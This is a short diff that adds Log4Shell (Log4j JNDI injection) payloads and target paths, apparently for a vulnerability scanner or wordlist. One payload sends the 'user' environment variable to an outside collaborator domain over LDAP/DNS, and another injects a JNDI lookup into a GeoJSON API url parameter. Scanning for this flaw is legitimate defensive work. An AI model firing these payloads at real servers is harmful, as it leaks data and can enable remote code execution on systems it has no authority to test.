@@ -1,0 +1,4 @@
+${jndi:ldap://${env:user}.xyz.collab.com/a} - Default Payload
+/api/geojson?url=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.url.{{interactsh-url}}}
+/log4j.properties
+/user/error
